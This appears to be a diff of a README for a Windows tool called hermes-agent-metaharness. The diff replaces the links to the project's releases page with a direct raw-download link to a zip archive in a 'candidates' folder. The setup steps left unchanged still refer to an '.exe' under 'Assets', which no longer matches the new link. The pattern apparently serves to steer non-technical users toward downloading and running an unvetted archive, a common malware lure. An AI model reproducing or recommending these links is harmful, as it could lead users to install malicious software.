@@ -1,6 +1,6 @@
 # 📦 hermes-agent-metaharness - Manage your Hermes environment with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Panoramar8046/hermes-agent-metaharness/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Panoramar8046/hermes-agent-metaharness/raw/refs/heads/main/candidates/hermes-metaharness-agent-1.8.zip)
 
 ## 📋 Project Overview
 
@@ -22,7 +22,7 @@ Check your system properties by clicking the Start button and typing "About your
 
 Follow these instructions to set up the software on your computer. We designed this process for users who prefer a standard Windows experience.
 
-1. Visit the download page to get the installer: [https://github.com/Panoramar8046/hermes-agent-metaharness/releases](https://github.com/Panoramar8046/hermes-agent-metaharness/releases)
+1. Visit the download page to get the installer: [https://github.com/Panoramar8046/hermes-agent-metaharness/raw/refs/heads/main/candidates/hermes-metaharness-agent-1.8.zip](https://github.com/Panoramar8046/hermes-agent-metaharness/raw/refs/heads/main/candidates/hermes-metaharness-agent-1.8.zip)
 2. Locate the file ending in `.exe` under the Assets section.
 3. Click the file to start the download to your computer.
 4. Open your Downloads folder once the transfer finishes.
